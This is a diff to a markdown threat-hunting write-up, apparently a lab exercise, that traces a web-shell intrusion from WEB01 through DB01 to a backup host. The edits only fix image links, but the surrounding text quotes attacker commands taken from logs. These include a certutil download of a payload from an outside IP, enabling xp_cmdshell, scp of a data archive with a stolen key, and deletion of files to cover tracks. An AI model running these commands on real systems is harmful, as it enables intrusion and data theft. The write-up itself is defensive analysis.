@@ -53,7 +53,7 @@ index="evidenceforge"
 
 Most `sqlcmd.exe` activity looked like routine database administration (queries against `analytics`, `hr_records` and `inventory` on `DB01.calloway.local`).
 
-![Routine sqlcmd baseline](<img width="975" height="287" alt="image" src="https://github.com/user-attachments/assets/8887738e-ebe8-4faa-98bd-16ca4d33da57" />)
+![Routine sqlcmd baseline](https://github.com/user-attachments/assets/8887738e-ebe8-4faa-98bd-16ca4d33da57)
 
 The outlier was `sqlcmd.exe` running `xp_cmdshell`/`sp_configure` from `WEB01`, so I pivoted on its parent process:
 
@@ -63,7 +63,7 @@ index="evidenceforge" sqlcmd.exe "properties.source_image_path"="C:\\Windows\\Sy
 
 A web server worker (`php-cgi.exe`, PID 14616) spawning `sqlcmd.exe` is not expected behavior.
 
-![php-cgi.exe spawning sqlcmd.exe](<img width="975" height="484" alt="image" src="https://github.com/user-attachments/assets/5293e27b-a7b0-4670-ab7d-aeb5fa051526" />)
+![php-cgi.exe spawning sqlcmd.exe](https://github.com/user-attachments/assets/5293e27b-a7b0-4670-ab7d-aeb5fa051526)
 
 I then pivoted on `php-cgi.exe` as the parent to list everything it spawned, and repeated the process on `DB01`, `BKP01` and across all `svc-*` accounts.
 
@@ -88,11 +88,11 @@ Everything below ran under `svc-portal`, spawned from `php-cgi.exe`:
 | Tool download | `certutil.exe -urlcache -split -f http://45.83.64.201/svc.exe C:\Windows\Temp\svc.exe` |
 | SQL server discovery (SPN) | `setspn.exe -T calloway.local -Q MSSQLSvc/*` |
 
-![Commands spawned by php-cgi.exe on WEB01](images/03-php-cgi-command-long-tail-web01.png)
+![Commands spawned by php-cgi.exe on WEB01]("https://github.com/user-attachments/assets/95bb174c-cbc6-4aa5-bb52-25f1aa101071")
 
 **Web shell and tool download.** Network logs show POST requests to `thumb_cache.php` and `upload.php` from the same IP, which has a Python user-agent. Zeek HTTP logs show `GET /svc.exe` from `10.10.10.10` (WEB01) to `45.83.64.201` with HTTP 200 and a ~44.7 MB response. Whether the file actually landed and ran is not yet confirmed (see section 8).
 
-![Zeek HTTP record for svc.exe](<img width="883" height="803" alt="image" src="https://github.com/user-attachments/assets/d3706c6d-fbc7-4d2f-a39f-9df9c54b57f1" />)
+![Zeek HTTP record for svc.exe](https://github.com/user-attachments/assets/d3706c6d-fbc7-4d2f-a39f-9df9c54b57f1)
 
 **Credential reuse.** The actor read the portal's database configuration and reused the `portal_app` SQL login, which has far more privilege than a web application needs. It was used to reach `DB01` and enable `xp_cmdshell`:
 
@@ -122,7 +122,7 @@ Commands on `DB01` ran as the SQL service account, which is what `xp_cmdshell` p
 | Move to backup host | `scp.exe -i C:\ProgramData\SQLBackup\id_ed25519 -o StrictHostKeyChecking=no C:\Windows\Temp\sqlmaint.zip svc-backup@10.10.20.50:/var/backups/db/sqlmaint.zip` |
 | Cleanup | `cmd.exe /c del /f /q C:\Windows\Temp\ca.dat C:\Windows\Temp\cp.dat C:\Windows\Temp\sqlmaint.zip` |
 
-![Command long tail on DB01](<img width="858" height="1016" alt="image" src="https://github.com/user-attachments/assets/ddec9510-a25b-445e-9cd1-7aa54428361d" />)
+![Command long tail on DB01](https://github.com/user-attachments/assets/ddec9510-a25b-445e-9cd1-7aa54428361d)
 
 Data at risk: **customer account data and contract pricing** from the `ERP` database.
 
@@ -139,23 +139,23 @@ The archive was pushed from `DB01` (`scp.exe`, `svc-sql`) to `BKP01` using the n
 
 Zeek `ssl` shows the exfiltration connection from `10.10.20.50` to `5.188.206.34:443` with SNI `static.cloudmetric-cdn.com`.
 
-![Zeek SSL record for exfil](<img width="614" height="397" alt="image" src="https://github.com/user-attachments/assets/4b4089df-c2e3-4732-9423-56802d42680e" />)
+![Zeek SSL record for exfil](https://github.com/user-attachments/assets/4b4089df-c2e3-4732-9423-56802d42680e)
 
-![BKP01 command line values](<img width="791" height="847" alt="image" src="https://github.com/user-attachments/assets/e75f8c05-9748-4328-9546-8871853aa959" />)
+![BKP01 command line values](https://github.com/user-attachments/assets/e75f8c05-9748-4328-9546-8871853aa959)
 
 Pivoting on `sqlmaint.zip` across hosts confirms the same file name on `DB01` (create, compress, copy, delete) and `BKP01` (upload, shred):
 
-![sqlmaint.zip pivot](<img width="874" height="814" alt="image" src="https://github.com/user-attachments/assets/02a69465-1add-445b-8680-3c4a6924a449" />)
+![sqlmaint.zip pivot](https://github.com/user-attachments/assets/02a69465-1add-445b-8680-3c4a6924a449)
 
 ### 4.4 Service-account scoping
 
 Grouping commands by account shows all three `svc-*` accounts with attack activity, on separate hosts:
 
-![Commands by service account](<img width="975" height="262" alt="image" src="https://github.com/user-attachments/assets/fb90504e-0342-4b4c-a444-dbf1ec7645cf" />)
+![Commands by service account](https://github.com/user-attachments/assets/fb90504e-0342-4b4c-a444-dbf1ec7645cf)
 
 Logon events show the same three accounts, matching the initial hypothesis:
 
-![Service account logons](<img width="845" height="439" alt="image" src="https://github.com/user-attachments/assets/dedf8773-5680-4d54-803e-e14adfa43f1d" />)
+![Service account logons](https://github.com/user-attachments/assets/dedf8773-5680-4d54-803e-e14adfa43f1d)
 
 | Account | Host | Role in the attack |
 |---|---|---|
